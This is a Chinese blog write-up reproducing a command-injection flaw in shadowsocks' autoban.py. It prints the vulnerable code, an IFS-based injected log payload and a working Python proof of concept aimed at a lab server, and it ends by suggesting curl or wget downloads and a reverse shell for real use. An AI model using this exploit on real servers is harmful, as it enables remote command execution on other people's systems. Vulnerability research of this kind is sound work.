---
title: shadowsocks远程命令执行
date: 2017-11-24 21:51:36
tags: shadowsocks
toc: true
---

利用条件：
1. 靶机上的`shadowsocks`是从`github`上`clone`的
2. 靶机开启了`autoban.py`脚本


---
问题出在`shadowsocks-master/utils/autoban.py`中
```
#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright (c) 2015 clowwindy
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from __future__ import absolute_import, division, print_function, \
    with_statement

import os
import sys
import argparse

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='See README')
    parser.add_argument('-c', '--count', default=3, type=int,
                        help='with how many failure times it should be '
                             'considered as an attack')
    config = parser.parse_args()
    ips = {}
    banned = set()
    for line in sys.stdin:
        if 'can not parse header when' in line:
            ip = line.split()[-1].split(':')[-2]
            if ip not in ips:
                ips[ip] = 1
                print(ip)
                sys.stdout.flush()
            else:
                ips[ip] += 1
            if ip not in banned and ips[ip] >= config.count:
                banned.add(ip)
                cmd = 'iptables -A INPUT -s %s -j DROP' % ip
                print(cmd, file=sys.stderr)
                sys.stderr.flush()
                os.system(cmd)
```
从sys.stdin读取输入，然后判断是否包含`can not parse header when`字样，如果有就进行截断
```
ip = line.split()[-1].split(':')[-2]
```
`split()`是采用默认空格为分隔符
当同一个`ip`出现的次数超过了设定的值（默认为3）,就会直接把它代入执行。
```
if ip not in banned and ips[ip] >= config.count:
                banned.add(ip)
                cmd = 'iptables -A INPUT -s %s -j DROP' % ip
                print(cmd, file=sys.stderr)
                sys.stderr.flush()
                os.system(cmd)
```

---
在靶机`192.168.32.51`上
下载`github`上的`shadowsocks`，使用
```
python ./shadowsocks/server.py -p 12345 -k 12345 --log-file /tmp/ss.log -d start
```
即可开启ss的服务
```
-p	端口
-k	口令
--log-file	日志文件
-d start	后台启动
```

客户端可用
```
python ./shadowsocks/local.py -s 192.168.32.51 -p 12345 -l 8090 -k 12345 
```
登录
```
-s	服务器地址
-p	服务器端口
-l	本地端口
-k	服务器登录口令
```
也可采用加载本地配置文件的方式启动
```
python ./shadowsocks/local.py -c /etc/shadowsocks.json
```

发现客户端对发送内容加密后才发送的。

ss服务器在接收到客户端发送过来的请求后，会对请求进行解析。关键解析函数`shadowsocks/common.py`中`parse_header(data)`函数在判断请求目标地址类型为域名后，会将其写入日志文件。

根据前面的分析，`payload`中是不能出现空格和`:`的，`:`可以避免，但是想执行命令，空格是必须的。
这里使用Linux中自带的IFS环境变量产生空格。
```
IFS(Internal Field Seprator)，即内部域分隔符，完整定义是“The shell uses the value stored in IFS, which is the space, tab, and newline characters by default, to delimit words for the read and set commands, when parsing output from command substitution, and when performing variable substituioin.”。
```
```
IFS=$' \t\n'  
```
使用`||`和` ${}`，尝试写入一个文件。
```
can not parse header when ||echo${IFS%??}'hacked！'>testhahaha.txt:\n
```

现在只需模拟客户端，把`payload`写到请求地址中就可以了。
```
# coding:utf-8
import socket
import sys,os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../'))
import cryptor 

head = """can not parse header when ||echo${IFS%??}'hacked！'>testhahaha.txt:\n"""
target = ("03%02x%s0050" % (len(head), head.encode('hex'))).decode('hex') # 参考socks5协议, 03表示target是域名，然后两字节域名长度，再是目的地址，最后两字节是port

for i in range(3):
    c = cryptor.Cryptor("12345", "aes-256-cfb")
    tosend = c.encrypt(target)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.32.51', 12345))
    s.send(tosend)
    s.close()
```
把这个py文件放入shadowsocks文件夹中运行即可。、

在服务器端执行
```
python ./shadowsocks/utils/autoban.py < /tmp/ss.log
```
在当前文件夹下就会生成`testhahaha.txt`文档,证明命令执行成功


实际使用时，可以结合`curl`、`wget`命令从服务器下载文件，然后反弹shell。


----
参考：
https://paper.tuisec.win/detail/63207b0184fe59e
http://foreversong.cn/archives/730
https://x41-dsec.de/lab/advisories/x41-2017-008-shadowsocks/
https://github.com/shadowsocks/shadowsocks/tree/master
[SOCKS5协议[rfc1928]](https://www.cnblogs.com/happyhotty/articles/2181522.html)
[bash ${ } 用法总结 ](http://unixboy.iteye.com/blog/499329)